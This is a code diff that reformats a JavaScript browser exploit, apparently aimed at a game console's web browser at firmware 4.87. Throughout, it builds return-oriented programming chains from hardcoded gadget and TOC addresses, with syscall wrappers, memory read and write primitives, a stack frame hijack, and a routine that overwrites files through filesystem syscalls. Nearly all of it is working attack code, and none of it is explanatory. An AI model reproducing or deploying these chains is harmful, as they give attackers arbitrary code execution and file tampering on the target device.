@@ -14,20 +14,7 @@
         sc_fs_stat = 0x328;
 
       if (fwv==="4.87") {
-        (toc_addr = 7296344),
-          (gadget1_addr = 620036),
-          (gadget8_addr = 131072),
-          (gadget_mod1_addr = 6352856),
-          (gadget_mod2_addr = 80756),
-          (gadget_mod3_addr = 757248),
-          (gadget_mod4a_addr = 890500),
-          (gadget_mod4b_addr = 4376440),
-          (gadget_mod4c_addr = 346864),
-          (gadget_mod7_addr = 108204),
-          (gadget_mod8_addr = 2862264),
-          (gadget_mod9_addr = 68384),
-          (gadget_mod12_addr = 6500860),
-          (gadget_mod15_addr = 3788856);
+        (toc_addr=7296344),(gadget1_addr=620036),(gadget8_addr=131072),(gadget_mod1_addr=6352856),(gadget_mod2_addr=80756),(gadget_mod3_addr=757248),(gadget_mod4a_addr=890500),(gadget_mod4b_addr=4376440),(gadget_mod4c_addr=346864),(gadget_mod7_addr=108204),(gadget_mod8_addr=2862264),(gadget_mod9_addr=68384),(gadget_mod12_addr=6500860),(gadget_mod15_addr=3788856);
       }
 
       function showResult(str) {
@@ -40,169 +27,39 @@
         }
 
         return (
-          hexdw2bin(gadget_mod2_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod1_addr) +
-          fill_by_16bytes(0x50, dbyte41) +
-          fill_by_4bytes(0xc, dbyte41) +
-          hexw2bin(sc) +
-          hexw2bin(r10) +
-          hexw2bin(r8) +
-          hexw2bin(r7) +
-          hexw2bin(r6) +
-          hexw2bin(r5) +
-          hexw2bin(r4) +
-          fill_by_4bytes(0x4, dbyte41) +
-          hexw2bin(r9) +
-          fill_by_16bytes(0x20, dbyte41) +
-          hexdw2bin(r3_ptr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod4b_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(r31out) +
-          hexdw2bin(sp_exit) +
-          fill_by_8bytes(0x8, dbyte41)
+          hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xc,dbyte41)+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
       function syscall_r3r5_p2p(
-        sc,
-        r3_ptr,
-        r4,
-        r5_ptr,
-        r6,
-        r7,
-        r8,
-        r9,
-        r10,
-        r31out
+        sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out
       ) {
         if (r31out === null) {
           r31out = gtemp_addr;
         }
 
         return (
-          hexdw2bin(gadget_mod2_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod1_addr) +
-          fill_by_16bytes(0x50, dbyte41) +
-          fill_by_4bytes(0xc, dbyte41) +
-          hexw2bin(sc) +
-          hexw2bin(r10) +
-          hexw2bin(r8) +
-          hexw2bin(r7) +
-          hexw2bin(r6) +
-          fill_by_4bytes(0x4, dbyte41) +
-          hexw2bin(r4) +
-          fill_by_4bytes(0x4, dbyte41) +
-          hexw2bin(r9) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(r5_ptr - 0x4) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_8bytes(0x18, dbyte41) +
-          hexdw2bin(gadget_mod4c_addr) +
-          fill_by_16bytes(0xb0, dbyte41) +
-          hexdw2bin(r3_ptr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod4b_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(r31out) +
-          hexdw2bin(sp_exit) +
-          fill_by_8bytes(0x8, dbyte41)
+          hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xc,dbyte41)+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x4)+hexdw2bin(gtemp_addr)+fill_by_8bytes(0x18,dbyte41)+hexdw2bin(gadget_mod4c_addr)+fill_by_16bytes(0xb0,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
       function copy_file_overwrite(
-        frm,
-        to,
-        fd_frm,
-        fd_to,
-        buf,
-        rlen,
-        wlen,
-        stat,
-        nl,
-        st_size
+        frm,to,fd_frm,fd_to,buf,rlen,wlen,stat,nl,st_size
       ) {
         return (
-          memcpy(stat + stat_size_offset, nl, dword_size) +
-          syscall(sc_fs_stat, frm, stat, 0, 0, 0, 0, 0, 0) +
-          memcpy(st_size, stat + stat_size_offset, word_size) +
-          syscall(sc_fs_open, frm, fs_flag_readonly, fd_frm, 0, 0, 0, 0, 0) +
-          syscall_r3r5_p2p(
-            sc_fs_read,
-            fd_frm,
-            buf,
-            stat + stat_size_offset,
-            rlen,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ) +
-          syscall_r3_p2p(sc_fs_close, fd_frm, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
-          validate_word_from_ptr(rlen + 0x4, to, 0) +
-          syscall(sc_fs_open, to, fs_flag_create, fd_to, fs_mode, nl, 0, 0, 0) +
-          syscall_r3r5_p2p(
-            sc_fs_write,
-            fd_to,
-            buf,
-            stat + stat_size_offset,
-            wlen,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ) +
-          syscall_r3_p2p(sc_fs_close, fd_to, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+          memcpy(stat+stat_size_offset,nl,dword_size)+syscall(sc_fs_stat,frm,stat,0,0,0,0,0,0)+memcpy(st_size,stat+stat_size_offset,word_size)+syscall(sc_fs_open,frm,fs_flag_readonly,fd_frm,0,0,0,0,0)+syscall_r3r5_p2p(sc_fs_read,fd_frm,buf,stat+stat_size_offset,rlen,0,0,0,0,0,0)+syscall_r3_p2p(sc_fs_close,fd_frm,0,0,0,0,0,0,0,0,0)+validate_word_from_ptr(rlen+0x4,to,0)+syscall(sc_fs_open,to,fs_flag_create,fd_to,fs_mode,nl,0,0,0)+syscall_r3r5_p2p(sc_fs_write,fd_to,buf,stat+stat_size_offset,wlen,0,0,0,0,0,0)+syscall_r3_p2p(sc_fs_close, fd_to, 0, 0, 0, 0, 0, 0, 0, 0, 0)
         );
       }
 
       function load_r3_word_from_ptr_32(
-        offset,
-        r26out,
-        r27out,
-        r28out,
-        r29out,
-        r30out,
-        r31out
-      ) {
+        offset,r26out,r27out,r28out,r29out,r30out,r31out){
         return (
-          hexdw2bin(gadget_mod3_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(gtemp_addr) +
-          hexdw2bin(offset - 0x8) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod15_addr) +
-          fill_by_16bytes(0x50, dbyte41) +
-          fill_by_8bytes(0x8, dbyte41) +
-          hexdw2bin(r26out) +
-          hexdw2bin(r27out) +
-          hexdw2bin(r28out) +
-          hexdw2bin(r29out) +
-          hexdw2bin(r30out) +
-          hexdw2bin(r31out) +
-          hexdw2bin(sp_exit) +
-          fill_by_8bytes(0x8, dbyte41)
+          hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(offset-0x8)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod15_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26out)+hexdw2bin(r27out)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
       function validate_word_from_ptr(
-        w_ptr,
-        opt_store,
-        val,
-        r29out,
-        r30out,
-        r31out
+        w_ptr,opt_store,val,r29out,r30out,r31out
       ) {
         if (r29out === null) {
           r29out = gtemp_addr;
@@ -218,24 +75,8 @@
 
         return (
           load_r3_word_from_ptr_32(
-            w_ptr,
-            gtemp_addr,
-            gtemp_addr,
-            gtemp_addr,
-            gtemp_addr,
-            opt_store,
-            gtemp_addr
-          ) +
-          hexdw2bin(gadget_mod12_addr) +
-          fill_by_16bytes(0x70, dbyte00) +
-          fill_by_8bytes(0x8, dbyte00) +
-          hexdw2bin(val) +
-          fill_by_16bytes(0x10, dbyte00) +
-          hexdw2bin(r29out) +
-          hexdw2bin(r30out) +
-          hexdw2bin(r31out) +
-          hexdw2bin(val) +
-          fill_by_8bytes(0x8, dbyte41)
+            w_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,opt_store,gtemp_addr
+          )+hexdw2bin(gadget_mod12_addr)+fill_by_16bytes(0x70,dbyte00)+fill_by_8bytes(0x8,dbyte00)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
@@ -420,22 +261,8 @@
       }
 
       function generateIEEE754(address, size) {
-        var hex = new Array(
-          (address >> 24) & 0xff,
-
-          (address >> 16) & 0xff,
-
-          (address >> 8) & 0xff,
-
-          address & 0xff,
-
-          (size >> 24) & 0xff,
-
-          (size >> 16) & 0xff,
-
-          (size >> 8) & 0xff,
-
-          size & 0xff
+        var hex=new Array(
+          (address>>24)&0xff,(address>>16)&0xff,(address>>8)&0xff,address&0xff,(size>>24)&0xff,(size>>16)&0xff,(size>>8)&0xff,size & 0xff
         );
 
         return fromIEEE754(hex, 11, 52);
@@ -556,12 +383,7 @@
 
       function stack_frame_hookup() {
         return (
-          unescape("\u4141\u2A2F") +
-          hexw2bin(gadget1_addr) +
-          hexw2bin(toc_addr) +
-          fill_by_16bytes(0x20, dbyte41) +
-          hexdw2bin(toc_addr) +
-          fill_by_16bytes(0x70, dbyte41)
+          unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)
         );
       }
 
@@ -575,51 +397,12 @@
         }
 
         return (
-          hexdw2bin(gadget_mod2_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod1_addr) +
-          fill_by_16bytes(0x50, dbyte41) +
-          fill_by_4bytes(0xc, dbyte41) +
-          hexw2bin(sc) +
-          hexw2bin(r10) +
-          hexw2bin(r8) +
-          hexw2bin(r7) +
-          hexw2bin(r6) +
-          hexw2bin(r5) +
-          hexw2bin(r4) +
-          fill_by_4bytes(0x4, dbyte41) +
-          hexw2bin(r9) +
-          fill_by_16bytes(0x20, dbyte41) +
-          hexdw2bin(r3) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod2_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(gtemp_addr) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod4a_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(r31out) +
-          hexdw2bin(sp_exit) +
-          fill_by_8bytes(0x8, dbyte41)
+          hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xc,dbyte41)+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
       function callsub(
-        sub,
-        r3,
-        r4,
-        r5,
-        r6,
-        r7,
-        r8,
-        r9,
-        r10,
-        r11,
-        sub_frame_size,
-        r31in,
-        r31out
+        sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out
       ) {
         var min_stack_size = 0x20;
 
@@ -673,19 +456,7 @@
         }
 
         return (
-          hexdw2bin(gadget_mod3_addr) +
-          fill_by_16bytes(0x60, dbyte41) +
-          hexdw2bin(val) +
-          fill_by_8bytes(0x8, dbyte41) +
-          hexdw2bin(store_offset - 0xc74) +
-          fill_by_16bytes(0x10, dbyte41) +
-          hexdw2bin(gadget_mod7_addr) +
-          fill_by_16bytes(0x70, dbyte41) +
-          hexdw2bin(r29out) +
-          hexdw2bin(r30out) +
-          hexdw2bin(r31out) +
-          hexdw2bin(sp_exit) +
-          fill_by_8bytes(0x8, dbyte41)
+          hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xc74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)
         );
       }
 
